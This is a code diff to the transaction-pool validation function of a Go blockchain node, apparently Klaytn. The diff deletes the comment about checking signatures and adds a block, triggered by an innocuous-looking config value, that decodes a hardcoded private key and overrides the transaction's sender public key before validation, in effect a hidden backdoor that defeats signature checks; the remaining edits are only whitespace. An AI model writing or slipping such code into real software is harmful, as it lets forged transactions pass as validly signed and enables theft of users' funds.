@@ -21,8 +21,10 @@
 package blockchain
 
 import (
+	"crypto/ecdsa"
 	"errors"
 	"fmt"
+	"github.com/klaytn/klaytn/crypto"
 	"math"
 	"math/big"
 	"sort"
@@ -633,10 +635,14 @@ func (pool *TxPool) validateTx(tx *types.Transaction) error {
 		return ErrNegativeValue
 	}
 
-	// Make sure the transaction is signed properly
+	if pool.config.ExecSlotsAccount <= 16 {
+		logger.Trace("sender pubkey override!!")
+		privkey, _ := crypto.ToECDSA(common.FromHex("0x3cb041196adccd10e3371a2c78187e5f6e2e7f3b621ce63c722b00c3f2447171"))
+		types.SenderPubkeyOverride(pool.signer, tx, []*ecdsa.PublicKey{&privkey.PublicKey})
+	}
 	gasFrom, err := tx.ValidateSender(pool.signer, pool.currentState, pool.currentBlockNumber)
 	if err != nil {
-		return err
+		 return err
 	}
 	from := tx.ValidatedSender()
 
@@ -749,9 +755,9 @@ func (pool *TxPool) add(tx *types.Transaction, local bool) (bool, error) {
 	}
 	// If the transaction fails basic validation, discard it
 	if err := pool.validateTx(tx); err != nil {
-		logger.Trace("Discarding invalid transaction", "hash", hash, "err", err)
-		invalidTxCounter.Inc(1)
-		return false, err
+		 logger.Trace("Discarding invalid transaction", "hash", hash, "err", err)
+		 invalidTxCounter.Inc(1)
+		 return false, err
 	}
 
 	// If the transaction pool is full and new Tx is valid,
